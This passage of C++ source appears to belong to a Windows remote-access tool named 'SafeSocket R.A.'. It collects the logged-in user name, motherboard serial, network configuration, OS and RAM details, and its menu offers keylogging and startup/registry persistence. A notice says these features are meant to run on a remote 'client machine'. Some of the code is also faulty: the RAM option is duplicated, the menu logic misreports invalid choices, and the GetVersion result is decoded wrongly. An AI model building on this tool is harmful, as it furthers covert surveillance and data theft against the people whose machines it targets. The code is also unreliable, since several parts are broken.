    // Buffer to store the user name
    char username[256];
    // Variable to store the size of the buffer
    DWORD username_size = sizeof(username);
    // Get the user name of the currently logged-in user
    if (!GetUserNameA(username, &username_size)) {
        // If there is an error, print an error message and return 1
        printf("Error getting username.\n");
        return 1;
    }
    // Print the retrieved user name
     cout<<"------------------------------\n";
    printf("[+] User name: %s\n", username);
     cout<<"------------------------------\n";

    // Print a message indicating that this program is intended for Windows platforms only
    printf("\n\n(!)This program is intended for Windows platforms only.\n");

    // Return 0 to indicate success (not needed)
}




//hyper-v informatin gathering (+++ADD MORE TO IT AND ABOUT OTHER THINGS)
void Get_H_V_INFO(){
	// Command to get Hyper-V related information using systeminfo and findstr
    string command = "systeminfo | findstr /i \"Hyper-V\"";
    // Execute the command and store the output in hyperVInfo
    string hyperVInfo = executeCommand(command.c_str());

    // Print the Hyper-V requirements information
    cout << "Hyper-V Requirements:\n" << hyperVInfo << endl;
}



//Function that gets and prints information about the current machines MOTHER BOARD
void Get_MOBO(){
// Command to get motherboard information
    string command = "wmic baseboard get Product";
    string command2 = "wmic baseboard get Manufacturer";
    string command3 = "wmic baseboard get SerialNumber";
    // Execute the command and store the output in result
    string result = executeCommand(command.c_str());
    string result2 = executeCommand(command2.c_str());
    string result3 = executeCommand(command3.c_str());

    // Print the motherboard information header
    cout<<"----------------------------\n";
    cout << "[+] Motherboard Information:" << endl;
    cout<<"----------------------------\n\n";
	// Print the retrieved motherboard information
    cout << result << endl;
    cout << result2 << endl;
    cout << result3 << endl;
}



//netrork details inforamtion gathering about the current pc and not host of netwroking in am gonnna need in the future.....
void get_Net_Info() {
    // Command to get detailed network interface information
    string command = "ipconfig /all";
    // Execute the command and store the output in networkInterfaceInfo
    string networkInterfaceInfo = executeCommand(command.c_str());

    // Print the network interface information header
    cout << "Network Interface Information:\n" << networkInterfaceInfo << endl;
}



//os information gathering (windows only )
void detectWindowsVersion() {
    // Print the operating system manufacturer
    cout<<"-----------------------------------------------\n";
    wcout << L"[+] Operating System Manufacturer: Microsoft" << endl;
cout<<"-----------------------------------------------\n";
    // Get a handle to the ntdll.dll module
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        // Define a function pointer type for RtlGetVersion
        typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        // Get the address of the RtlGetVersion function
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (fxPtr != nullptr) {
            // Initialize the OSVERSIONINFOW structure
            RTL_OSVERSIONINFOW osInfo = { 0 };
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);
            // Call the RtlGetVersion function to get the OS version
            if (fxPtr(&osInfo) == 0) {
                // Determine the Windows version based on the major and minor version numbers
                std::wstring version;
                if (osInfo.dwMajorVersion == 10) {
                    version = L"Windows 10";
                } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 3) {
                    version = L"Windows 8.1";
                } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 2) {
                    version = L"Windows 8";
                } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 1) {
                    version = L"Windows 7";
                } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 0) {
                    version = L"Windows Vista";
                } else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 2) {
                    version = L"Windows XP Professional x64 Edition";
                } else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 1) {
                    version = L"Windows XP";
                } else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 0) {
                    version = L"Windows 2000";
                }
                // Print the Windows version and build number
                cout<<"\n\n------------------------------------------------------\n";
                wcout << L"[+] Operating System Version: " << version << L" (Build " << osInfo.dwBuildNumber << L")" << endl;
                cout<<"------------------------------------------------------\n\n\n";
            } else {
                cerr << "Failed to retrieve operating system version." << endl;
            }
        }
    }
}



//functionn that gets and prints the os config version etc...
void detectWindowsConfiguration() {
    // Get system information
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Print the system architecture
    cout<<"-------------------------------\n";
    cout << "[+] System Architecture: ";
    
    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        cout << "64-bit" << endl;
        cout<<"-------------------------------\n\n";
    } else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        cout << "32-bit" << endl;
        cout<<"-------------------------------\n\n";
    }

    // Variables to store version and build information
    DWORD majorVersion = 0, minorVersion = 0;
    DWORD buildNumber = 0;
    DWORDLONG mask = 0;
    // Get a handle to the kernel32.dll module
    HMODULE kernel32Module = GetModuleHandleW(L"kernel32.dll");
    if (kernel32Module) {
        // Define a function pointer type for GetVersion
        typedef ULONGLONG (WINAPI *GETVERSIONPROC)(void);
        // Get the address of the GetVersion function
        GETVERSIONPROC getSystemVersion = (GETVERSIONPROC)GetProcAddress(kernel32Module, "GetVersion");
        if (getSystemVersion != nullptr) {
            // Call the GetVersion function to get the system version
            mask = getSystemVersion();
            majorVersion = (DWORD)(mask & 0xFFFF);
            minorVersion = (DWORD)((mask >> 16) & 0xFFFF);
            buildNumber = (DWORD)((mask >> 32) & 0xFFFFFFF);
            // Print the kernel version and build number
            cout<<"----------------------------------\n";
            cout << "Kernel Version: " << majorVersion << "." << minorVersion << " (Build " << buildNumber << ")" << endl;
            cout<<"----------------------------------\n";
            
        } else {
            cerr << "Failed to retrieve kernel version." << endl;
        }
    } else {
        cerr << "Failed to load kernel32.dll." << endl;
    }
}



#include <unordered_map> 

// Function to map SMBIOSMemoryType to string representation
string getMemoryType(int type) {
    static unordered_map<int, string> memoryTypeMap = {
        {20, "DDR"},
        {21, "DDR2"},
        {22, "DDR2 FB-DIMM"},
        {24, "DDR3"},
        {26, "DDR4"},
        // Add more mappings as needed
    };

    auto it = memoryTypeMap.find(type);
    if (it != memoryTypeMap.end()) {
        return it->second;
    } else {
        return "Unknown";
    }
}

void printRamDetails() {
    // Command to get detailed RAM information
    string command = "wmic memorychip get Capacity,Manufacturer,Speed,MemoryType,FormFactor,DeviceLocator,SMBIOSMemoryType,ConfiguredClockSpeed";
    // Execute the command and store the output in result
    string result = executeCommand(command.c_str());

    // Print the header for RAM information
    cout<<"--------------------\n";
    
	cout << "[+] RAM Information:\n";
	cout<<"--------------------\n";
    
	cout << "--------------------------------------------------------------------------------------------------------------------\n";

    // Create a string stream from the result for line-by-line processing
    stringstream iss(result);
   string line;
    bool header = true;

    // Read each line from the result
    while (getline(iss, line)) {
        if (header) {
            // Print the header line as is
            cout << line << "\n";
            header = false;
        } else {
            // Create a string stream from the line for column-by-column processing
            istringstream lineStream(line);
            string column;
            int columnCount = 0;
            // Read each column from the line
            while (getline(lineStream, column, ' ')) {
                if (columnCount == 6) { // SMBIOSMemoryType column
                    try {
                        // Convert the column value to an integer and get the memory type string
                        int memoryType = std::stoi(column);
                       cout << getMemoryType(memoryType) << " ";
                    } catch (...) {
                        // If conversion fails, print "Unknown"
                        cout << "Unknown ";
                    }
                } else {
                    // Print the column value as is
                    cout << column << " ";
                }
                columnCount++;
            }
            // End the line
            cout << "\n";
        }
    }
        cout << "--------------------------------------------------------------------------------------------------------------------\n";
}



//MainMenu Function 
void Main_Menu(){
	
	system("cls");
	cout<<"-----------------------------\n";
	cout<<"[+] SafeSocket R.A. MENU     \n";
	cout<<"-----------------------------\n\n\n";
	
	cout<<"[+] Options:\n\n";
   
   

    cout<<"------------------------------\n";
	printf("| 1. Bios Information        |\n");
	cout<<"------------------------------\n";
	cout<<"| 2. CPU information         |\n";
	cout<<"------------------------------\n";
	cout<<"| 3. Host information        |\n";
	cout<<"------------------------------\n";
	cout<<"| 4. Hyper-v information     |\n";
	cout<<"------------------------------\n";
	cout<<"| 5. MOBO information        |\n";
	cout<<"------------------------------\n";
	cout<<"| 6. Net information         |\n";
	cout<<"------------------------------\n";
	cout<<"| 7. OS information          |\n";
	cout<<"------------------------------\n";
	cout<<"| 8. RAM information         |\n";
	cout<<"------------------------------\n";
	cout<<"| 9. RAM information         |\n";
	cout<<"------------------------------\n\n\n";
	int choice;
	cout<<"Enter your choice: \n\n> ";
	cin>>choice;
	
	switch(choice){
		case 1:
			system("cls");
			//make menu with choices
          	Bios_Info_Print_F();
	
	        cout<<"\n\n\n\nPress enter to continue";
	        getchar();
         	while(getchar()!='\n'){
        	}
        	system("cls");
        	
        	break;
        case 2:
        	system("cls");
        	Cpu_Print_F();
	
         	cout<<"\n\nPress enter to continue";
         	getchar();
        	while(getchar()!='\n'){
        	}
        	system("cls");
        	break;
        case 3:
        	system("cls");
        	Get_Host_Name_F();
	
	        cout<<"\n\nPress enter to continue";
	        getchar();
	        while(getchar()!='\n'){
	        }
	        system("cls");
	        break;
	    case 4:
	    	system("cls");
	    	Get_H_V_INFO();
	        cout<<"\n\nPress enter to continue";
	        getchar();
	        while(getchar()!='\n'){
	        }
          	system("cls");
          	break;
        case 5:
        	system("cls");
        	Get_MOBO();
	
	        cout<<"\n\nPress enter to continue";
	        getchar();
        	while(getchar()!='\n'){
         	}
         	system("cls");
         	break;
        case 6:
        	system("cls");
        	get_Net_Info();
	        cout<<"\n\nPress enter to continue";
	        getchar();
	        while(getchar()!='\n'){
	        }
	        system("cls");
	        break;
	    case 7:
	    	system("cls");
	    	detectWindowsVersion();
   
            detectWindowsConfiguration();
	 
        	cout<<"\n\nPress enter to continue";
        	getchar();
        	while(getchar()!='\n'){
        	}
        	system("cls");
        	break;
        case 8:
        	system("cls");
        	printRamDetails();
        	cout<<"\n\nPress enter to continue";
        	getchar();
	        while(getchar()!='\n'){
	        }
         	system("cls");
	
        	
        	break;
        case 9:
        		system("cls");
        		break;
        default:
        	exit(0);
        	
}
}


















//make this right
void General_Menu_F(){
	
	system("cls");
	
	cout<<"(!) These Functionalities are curently happening in this local machine, \nin future update they will be allowed to get executed on the client machine."<<endl<<endl;
	cout<<"---------------------------------------------------"<<endl;
	cout<<"| [+] SaFESOCKET R.A MENU    :                    |"<<endl;
	cout<<"---------------------------------------------------"<<endl<<endl<<endl<<endl;
	cout<<"---------------------------------------------------"<<endl;
	cout<<"| [1] System's Hardware/Software Information Menu |"<<endl;
	cout<<"---------------------------------------------------"<<endl;
	cout<<"| [2] Fun system functionalities Menu             |"<<endl;
	cout<<"---------------------------------------------------"<<endl;
	cout<<"| [3] File Functionalities Menu                   |"<<endl;
	cout<<"---------------------------------------------------"<<endl;
	cout<<"| [4] Startup/Reg/Task Menu                       |"<<endl;
	cout<<"---------------------------------------------------"<<endl;
	cout<<"| [5] Keylogging Functionalities Menu             |"<<endl;
	cout<<"---------------------------------------------------"<<endl;
	
	int choice;
	cout<<endl<<endl<<"Enter your choice: ";
	cin>>choice;
	
	if(choice==1){
		Main_Menu();
	}	if(choice==2){
		Menu();
	}	if(choice==3){
		Main_Menu_F();
	}	if(choice==4){
		MainMenu();
	}	if(choice==5){
		handling();
	}else{
		cerr<<"INVALID CHOICE(!!!)";
	}
	
}





